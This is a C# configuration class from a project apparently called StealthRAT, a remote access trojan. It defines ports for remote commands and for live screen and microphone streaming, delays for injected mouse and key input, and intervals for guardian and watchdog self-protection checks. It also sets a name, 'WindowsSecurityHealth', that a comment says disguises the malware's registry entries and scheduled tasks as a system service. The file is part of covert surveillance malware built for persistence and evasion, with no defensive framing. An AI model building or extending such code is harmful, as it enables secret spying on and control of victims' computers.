namespace StealthRAT.Models;

/// <summary>
/// Contains all server configuration constants used throughout the application.
/// Centralizes configuration to avoid magic numbers and enable easy modification.
/// </summary>
public static class ServerConfiguration
{
    /// <summary>
    /// The TCP port used for receiving and processing remote commands.
    /// </summary>
    public const int CommandPort = 9090;

    /// <summary>
    /// The TCP port used for streaming screen capture data.
    /// </summary>
    public const int ScreenPort = 9091;

    /// <summary>
    /// The TCP port used for streaming audio capture data.
    /// </summary>
    public const int AudioPort = 9092;

    /// <summary>
    /// JPEG compression quality for screen captures (0-100).
    /// Lower values produce smaller files with reduced quality.
    /// 70 provides a good balance between quality and bandwidth.
    /// </summary>
    public const long JpegQuality = 70L;

    /// <summary>
    /// Target frames per second for screen streaming mode.
    /// </summary>
    public const int StreamFps = 10;

    /// <summary>
    /// Delay between stream frames in milliseconds (1000 / StreamFps).
    /// </summary>
    public const int StreamFrameDelayMs = 1000 / StreamFps;

    /// <summary>
    /// Audio sample rate in Hz for microphone capture.
    /// 16000 Hz provides acceptable quality for voice communication.
    /// </summary>
    public const int AudioSampleRate = 16000;

    /// <summary>
    /// Audio bit depth for microphone capture.
    /// 16-bit provides CD-quality audio resolution.
    /// </summary>
    public const int AudioBitDepth = 16;

    /// <summary>
    /// Number of audio channels (1 = mono, 2 = stereo).
    /// Mono is sufficient for voice and reduces bandwidth usage.
    /// </summary>
    public const int AudioChannels = 1;

    /// <summary>
    /// Delay in milliseconds between mouse button down and up events.
    /// </summary>
    public const int MouseClickDelayMs = 50;

    /// <summary>
    /// Delay in milliseconds between key down and key up events.
    /// </summary>
    public const int KeyPressDelayMs = 30;

    /// <summary>
    /// Interval in seconds for the guardian process health check.
    /// </summary>
    public const int GuardianCheckIntervalSec = 5;

    /// <summary>
    /// Interval in seconds for the watchdog self-protection check.
    /// </summary>
    public const int WatchdogIntervalSec = 3;

    /// <summary>
    /// Name used for registry entries and scheduled tasks (disguised as system service).
    /// </summary>
    public const string DisguisedName = "WindowsSecurityHealth";
}
